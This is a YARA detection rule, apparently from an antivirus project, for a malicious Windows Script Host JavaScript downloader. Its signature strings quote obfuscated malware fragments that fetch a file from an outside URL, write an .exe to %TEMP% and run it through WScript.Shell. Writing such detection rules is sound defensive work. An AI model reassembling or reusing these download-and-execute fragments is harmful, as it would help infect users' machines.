rule sig_20160328_2ee83f3b4304ca967fbb7c2de5869c51 {
  meta:
    description = "datamaliciousorder - file 20160328_2ee83f3b4304ca967fbb7c2de5869c51.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "19e85db08dbc48a8066bd9f63e3db9052bb2781cb6ba8825a50abff39a4ed923"

  strings:
    $s1  = "function Qhpjhn() {return Faxvvolc[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"XmfhQWXcPpx4W4la.exe\";};" fullword ascii
    $s2  = "do {WScript[Gjognx](Xnilkc() * 11)} while (Hxnbcfpw[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Ggmxs(Ljmxh, Oulrc){return Ljmxh - Oulrc;};" fullword ascii
    $s4  = "Hxnbcfpw[Jpappp](\"GET\", \"http://www.cloudfire.pt/l3iska\", false);" fullword ascii
    $s5  = "var Faxvvolc = function Jnfyyi() {return WScript[Auxikyo](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Hqgwhhwzxa() {return ((Tseksestss == true) && (Tseksestss == Mplrejv)) ? 1 : Rleuccg;};" fullword ascii
    $s7  = "function Lfwhzfbax(Ilyfnciym){Faxvvolc[\"Run\"](Ilyfnciym, Rleuccg, Rleuccg);};" fullword ascii
    $s8  = "function Xnilkc(){return 22;};" fullword ascii
    $s9  = "return Ggmxs(Tnnkpuig, Xbhvqblz);" fullword ascii
    $s10 = "Tseksestss = true; " fullword ascii
    $s11 = "var Tseksestss = false;" fullword ascii
    $s12 = "var Dlbikkskn = false;" fullword ascii
    $s13 = " while (Jovufnabc){" fullword ascii
    $s14 = "function Uaqec(Fqzzgr) {var Fwxipjjhq = (1, 2, 3, 4, 5, Fqzzgr); return Fwxipjjhq;};" fullword ascii
    $s15 = "Mplrejv = true; " fullword ascii
    $s16 = "var Xyauzdkw = new this[\"Date\"]();" fullword ascii
    $s17 = "function Cisjxqywde(){return Auxikyo;};" fullword ascii
    $s18 = "var Mplrejv = false;" fullword ascii
    $s19 = "function Tlzmrpkbrr(){return Cteqacojde;};" fullword ascii
    $s20 = "function Zesnf()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}